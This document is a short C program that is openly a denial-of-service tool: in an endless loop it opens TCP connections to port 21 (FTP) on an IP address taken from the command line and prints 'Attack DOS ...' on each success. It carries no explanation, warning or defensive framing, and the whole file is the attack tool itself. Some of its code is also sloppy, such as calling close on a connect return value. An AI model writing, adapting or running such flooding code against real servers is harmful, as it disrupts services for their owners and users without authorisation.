#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (int argc, char *argv[]) {

	int mysocket;
	int connect1;

	int port = 21;
	char *dest;
	dest = argv[1];
	int inf = 0;

	struct sockaddr_in target;

	while(inf == 0){

        mysocket = socket(AF_INET, SOCK_STREAM,0);	
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(dest); 

        connect1 =  connect(mysocket, (struct sockaddr *)&target, sizeof target);

            if(connect1 == 0) {
                printf("Attack DOS ...\n");
                close(mysocket);
                close(connect1);          
            }else{
                printf("Connection failed !!! \n");
            }
	}
}
